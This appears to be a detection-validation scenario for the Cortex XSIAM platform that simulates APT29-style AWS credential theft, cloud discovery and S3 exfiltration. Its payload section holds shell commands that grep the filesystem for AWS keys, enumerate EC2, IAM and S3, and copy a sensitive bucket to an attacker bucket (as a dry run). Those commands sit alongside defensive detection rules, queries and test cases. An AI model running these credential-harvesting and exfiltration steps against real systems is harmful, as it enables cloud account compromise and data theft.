identity.name: APT29 Hybrid Cloud Credential Theft → Cloud Pivot → S3 Exfil Stitch (T1552.001)
identity.summary: Modeled on APT29 / Midnight Blizzard cloud TTPs: a web service account greps the filesystem for AWS keys, uses the discovered credentials from the same host to call the AWS API, enumerates EC2/IAM/S3, reads a sensitivity-tagged bucket, and copies data to an attacker-owned bucket. The Cortex value is hybrid stitching: XSIAM joins the endpoint XDR process leg (cloud_audit's missing 'who ran it')…
identity.description: APT29 (Midnight Blizzard) is the canonical hybrid-cloud adversary: harvest credentials on an endpoint, then operate entirely through legitimate cloud APIs where endpoint EDR has no visibility. This scenario stitches the two planes XSIAM must fuse. The endpoint plane (Cortex XDR, xdr_data) sees the recursive AWS-key grep, the filesystem traversal of /home and /root, and the aws CLI launched by www-data with inline access-key env vars — establishing WHO and from WHICH host the keys were used. The cloud plane (Cortex Cloud / CDR, cloud_audit backed by CloudTrail) sees sts:GetCallerIdentity from an unenrolled source IP, the EC2+IAM+S3 multi-service discovery burst, the GetBucketAcl/ListObjects on the sensitivity-tagged bucket, and the cross-account S3 CopyObject to the attacker bucket. The endpoint plane alone cannot prove the keys were abused in the cloud; the cloud plane alone cannot attribute the API calls to a compromised host and identity. The correlation rules join the two on the AWS access-key-id / principal within a 60s window, producing the full APT29 story: cred dump (EDR) → cloud pivot (CDR) → discovery → collection → exfil under one incident_id. All API calls use AWS example credentials and dry-run flags — safe by design.

techniques.name: Command and Scripting Interpreter: Unix Shell

execution.framework_reference_id: T1552.001 + aws.credential-access.* / aws.exfiltration.* — Stratus Red Team AWS techniques

prerequisites.description: Cortex XDR Linux agent installed and reporting healthy on the web host.
prerequisites.check_command: systemctl is-active cortex-agent || ps aux | grep -i traps

prerequisites.description: Cortex Cloud / CDR ingesting AWS CloudTrail into the cloud_audit dataset for the target account.
prerequisites.check_command: echo 'verify cloud_audit dataset is receiving CloudTrail in XSIAM'

prerequisites.description: AWS CLI available on the endpoint (example credentials are used).

payload.code:
# Uses AWS example credentials + dry-run flags — safe by design.
grep -r -l -E 'AKIA[0-9A-Z]{16}|aws_secret_access_key' /home /var/www /opt 2>/dev/null | head -20
find / -name 'credentials' -path '*/.aws/*' 2>/dev/null
export AWS_ACCESS_KEY_ID="${AWS_ACCESS_KEY_ID:-AKIAIOSFODNN7EXAMPLE}"
export AWS_SECRET_ACCESS_KEY="${AWS_SECRET_ACCESS_KEY:-wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY}"
aws sts get-caller-identity --region us-east-1 2>&1 | head -5 || true
aws ec2 describe-instances --region us-east-1 --max-items 5 2>&1 | head -20 || true
aws iam list-users --max-items 10 2>&1 | head -20 || true
aws s3 ls 2>&1 | head -20 || true
aws s3 ls s3://cortexsim-sensitive-demo/ --recursive 2>&1 | head -20 || true
aws s3 cp s3://cortexsim-sensitive-demo/ s3://cortexsim-attacker-drop/ --recursive --dryrun 2>&1 | head -10 || true

expected_artifacts.description: grep recursing for the AWS access-key pattern from www-data.
CloudTrail sts:GetCallerIdentity from an unenrolled source IP.
Multi-service discovery burst (ec2:DescribeInstances + iam:ListUsers + s3:ListBuckets) from one principal.
S3 CopyObject to an attacker-owned destination bucket.

cleanup.code:
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY
rm -f /tmp/cortexsim_mp004_*.json /tmp/cortexsim_mp004_*.log
echo '[CortexSim] SIM-MP-004 cleanup complete - no persistent artifacts'

iocs.context: Attacker-controlled S3 destination bucket on the TIM watchlist. The IOC match on the CopyObject destination is cross-referenced with the sensitivity-tagged source bucket and the discovery burst to confirm the exfil leg of the APT29 chain.

biocs.name: MP-004 Recursive AWS Key Pattern Grep From Service Account
biocs.description: XDR — recursive credential-pattern grep from non-interactive service account. The endpoint credential-access leg: www-data greps the filesystem for AWS key material.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("grep", "egrep", "rg", "find")
| filter action_process_image_command_line contains_any ("AKIA", "aws_secret_access_key", ".aws/credentials")
| filter actor_effective_username in ("www-data", "nobody", "apache", "nginx")

biocs.name: MP-004 AWS CLI Invoked By www-data With Inline Access Key Env
biocs.description: XDR — aws cli invoked by www-data with inline access-key env vars. The hybrid pivot: the endpoint process that turns discovered keys into cloud API calls — the 'who/where' the cloud_audit leg cannot see.
biocs.logic:
preset = xdr_data
| filter event_type = ENUM.PROCESS
| filter event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = "aws"
| filter actor_effective_username in ("www-data", "nobody", "apache", "nginx")
| filter action_process_image_command_line contains_any ("sts", "get-caller-identity", "ec2", "s3", "iam")

biocs.name: MP-004 Cloud Multi Service Describe List Burst From Single Principal
biocs.description: CDR — multi-service describe/list burst (EC2+IAM+S3) from single principal in <30s. Cloud discovery: one principal touches three services in a tight window.
biocs.logic:
dataset = cloud_audit
| filter cloud_provider = "AWS"
| filter event_name in ("DescribeInstances", "ListUsers", "ListBuckets", "ListAccessKeys", "GetAccountSummary")
| comp count_distinct(event_source) as service_count, count() as call_count by user_identity_access_key_id, bin(_time, 30s) as window
| filter service_count >= 3

biocs.name: MP-004 GetBucketAcl And ListObjects On Sensitive Tagged Bucket
biocs.description: CDR — GetBucketAcl + ListObjects on sensitivity-tagged bucket by unauthorized principal. Cloud collection: targeted access to the sensitive bucket.
biocs.logic:
dataset = cloud_audit
| filter cloud_provider = "AWS" and event_source = "s3.amazonaws.com"
| filter event_name in ("GetBucketAcl", "ListObjects", "ListObjectsV2", "GetObject")
| filter request_parameters_bucket_name = "cortexsim-sensitive-demo"
| comp count() as access_count by user_identity_access_key_id, request_parameters_bucket_name

biocs.name: MP-004 S3 CopyObject To Non Owned Destination Bucket
biocs.description: CDR — S3 CopyObject to non-owned destination account/bucket. Cloud exfil: data copied from the sensitive source to the attacker-owned bucket.
biocs.logic:
dataset = cloud_audit
| filter cloud_provider = "AWS" and event_source = "s3.amazonaws.com"
| filter event_name in ("CopyObject", "PutObject")
| filter request_parameters_bucket_name = "cortexsim-attacker-drop"
| comp count() as copy_count by user_identity_access_key_id, request_parameters_bucket_name

xql_queries.name: MP-004 Service Account Traversing Home And Root Dirs
xql_queries.query:
preset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("grep", "find", "egrep", "rg")
| filter action_process_image_command_line contains_any ("/home", "/root", "/opt", "/var/www")
| filter actor_effective_username != "root"
| fields _time, agent_hostname, actor_effective_username, action_process_image_command_line

xql_queries.name: MP-004 CloudTrail GetCallerIdentity From Unenrolled Source IP
xql_queries.query:
dataset = cloud_audit
| filter _time > to_timestamp(current_time() - 1800)
| filter cloud_provider = "AWS" and event_source = "sts.amazonaws.com" and event_name = "GetCallerIdentity"
| fields _time, user_identity_access_key_id, user_identity_arn, source_ip, user_agent

xql_queries.name: MP-004 Stitch Endpoint Process With Cloud Audit By Principal
xql_queries.query:
dataset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter (event_type = ENUM.PROCESS and actor_process_image_name = "aws") or (_product = "cloud_audit" and event_name = "GetCallerIdentity")
| comp count_distinct(_product) as plane_count, count_distinct(incident_id) as incident_count by actor_effective_username
| filter plane_count >= 2 and incident_count = 1
| fields actor_effective_username, plane_count, incident_count

xql_queries.name: MP-004 UEBA First Time Broad Cloud Discovery Pattern
xql_queries.query:
dataset = cloud_audit
| filter _time > to_timestamp(current_time() - 1800)
| filter cloud_provider = "AWS"
| filter event_name contains_any ("Describe", "List", "Get")
| comp count_distinct(event_source) as services_touched, count() as total_calls by user_identity_access_key_id, bin(_time, 5m) as window
| filter services_touched >= 3
| fields window, user_identity_access_key_id, services_touched, total_calls

xql_queries.name: MP-004 Cloud Data Egress Volume Anomaly From Tagged Source
xql_queries.query:
dataset = cloud_audit
| filter _time > to_timestamp(current_time() - 1800)
| filter cloud_provider = "AWS" and event_source = "s3.amazonaws.com"
| filter event_name in ("CopyObject", "GetObject", "PutObject")
| filter request_parameters_bucket_name in ("cortexsim-sensitive-demo", "cortexsim-attacker-drop")
| comp count() as object_ops by user_identity_access_key_id, request_parameters_bucket_name
| fields user_identity_access_key_id, request_parameters_bucket_name, object_ops

xql_queries.name: MP-004 Stitch Full Kill Chain Cred Dump To Cloud Exfil
xql_queries.query:
dataset = xdr_data
| filter _time > to_timestamp(current_time() - 1800)
| filter (event_type = ENUM.PROCESS and actor_process_image_name in ("grep", "aws")) or (_product = "cloud_audit" and event_name in ("GetCallerIdentity", "DescribeInstances", "ListObjects", "CopyObject"))
| comp count_distinct(_product) as plane_count, count_distinct(incident_id) as incident_count, count_distinct(event_name) as stage_count by actor_effective_username
| filter plane_count >= 2 and incident_count = 1
| fields actor_effective_username, plane_count, incident_count, stage_count

correlation_rules.name: Hybrid Cloud Cred Pivot Stitch — XDR AWS CLI + CloudTrail Principal
correlation_rules.logic: (BIOC(MP-004 AWS CLI Invoked By www-data With Inline Access Key Env) AND XQL(MP-004 CloudTrail GetCallerIdentity From Unenrolled Source IP)) -> join on aws_access_key_id within 60s

correlation_rules.name: Cloud Discovery To Collection Stitch — Multi Service Burst + Sensitive Bucket
correlation_rules.logic: (BIOC(MP-004 Cloud Multi Service Describe List Burst From Single Principal) AND BIOC(MP-004 GetBucketAcl And ListObjects On Sensitive Tagged Bucket)) -> join on aws_access_key_id within 300s

correlation_rules.name: APT29 Full Kill Chain Stitch — Cred Dump To Cloud Exfil
correlation_rules.logic: (BIOC(MP-004 Recursive AWS Key Pattern Grep From Service Account) OR BIOC(MP-004 AWS CLI Invoked By www-data With Inline Access Key Env)) AND BIOC(MP-004 S3 CopyObject To Non Owned Destination Bucket) AND IOC(aws-s3-bucket: cortexsim-attacker-drop) -> join on principal within 1800s

analytics_modules: Cortex Cloud CDR — CloudTrail anomaly analytics (unenrolled-IP API use)
Cortex Cloud CDR — UEBA principal-behavior deviation
Cortex XSIAM Correlation Engine — hybrid endpoint↔cloud_audit stitch by AWS principal

products.evidence_query: dataset = cloud_audit | filter event_name = "GetCallerIdentity" | fields _time, user_identity_access_key_id, source_ip
dataset = cloud_audit | filter event_name = "CopyObject" and request_parameters_bucket_name = "cortexsim-attacker-drop"
preset = xdr_data | filter actor_process_image_name = "grep" and action_process_image_command_line contains "AKIA" | fields _time, agent_hostname, action_process_image_command_line
Correlation CR-MP-0007/0008/0009 join the XDR endpoint legs to the cloud_audit legs on AWS access-key-id / principal, fusing the APT29 chain into one incident.
Playbook deactivates the leaked AWS access key, isolates the source host, and revokes the cross-account bucket policy.

use_cases.name: Hybrid Cloud Credential Theft Stitching — Endpoint Cred Dump → Cloud API Abuse → S3 Exfil
use_cases.description: Validate that XSIAM stitches the endpoint cred-dump, the cloud API pivot, and the S3 exfil into a single APT29 incident across EDR + CDR planes.

test_cases.objective: Each plane fires (XDR grep/aws BIOCs + CDR CloudTrail anomalies).
preconditions: Cortex XDR Linux agent >= 8.4.0 healthy on the web host.
Cortex Cloud / CDR ingesting CloudTrail into cloud_audit.
steps: Confirm the XDR aws-CLI BIOC and the CDR CloudTrail/S3 detections each return rows.
success_criteria: BIOC `MP-004 AWS CLI Invoked By www-data With Inline Access Key Env` fires within 60s.
BIOC `MP-004 S3 CopyObject To Non Owned Destination Bucket` fires on the exfil step.

test_cases.objective: Endpoint and cloud legs stitch into one hybrid incident on the AWS principal.
success_criteria: Correlation `CR-MP-0007` joins the XDR aws process and the CloudTrail GetCallerIdentity on access-key-id.
Stitch XQL returns plane_count >= 2 and incident_count = 1.

test_cases.objective: The full kill chain (cred-dump → pivot → discovery → collection → exfil) lands under one story with the attacker-bucket IOC.
success_criteria: Correlation `CR-MP-0009` produces one incident spanning >= 2 planes and the IOC match on `cortexsim-attacker-drop`.

preventive_controls: Scope IAM access keys with least privilege; prefer short-lived STS roles and forbid long-lived keys on web tiers.
Enforce IMDSv2 and SCPs that deny cross-account S3 writes to non-allowlisted buckets.
Run web services under least-privilege OS accounts that cannot read other users' home directories or .aws credentials.
Enable Cortex Cloud CDR with CloudTrail ingestion and S3 data-event logging across the org.
detection_engineering: Stitch the endpoint process that launched the aws CLI to the CloudTrail session on the shared access-key-id to attribute cloud API abuse to a compromised host.
Alert on multi-service discovery bursts and first-time broad enumeration per principal (UEBA deviation).
Cross-reference S3 CopyObject/PutObject destinations against TIM watchlists and the sensitivity-tagged source bucket to confirm exfil intent.

references.title: Unit42 - APT29 / Midnight Blizzard Cloud TTPs
MITRE ATT&CK T1552.001 — Credentials In Files

changelog.change: Replaced skeleton detections with real hybrid endpoint/cloud stitching content: 5 BIOCs (XDR grep + aws CLI, CDR discovery burst + sensitive-bucket access + CopyObject), 6 validation XQL (xdr_data + cloud_audit legs + stitch), 1 IOC, and 3 correlation rules CR-MP-0007/0008/0009 joining EDR to cloud_audit on AWS principal. Enriched APT29 threat context + panw_mapping. Promoted to active.
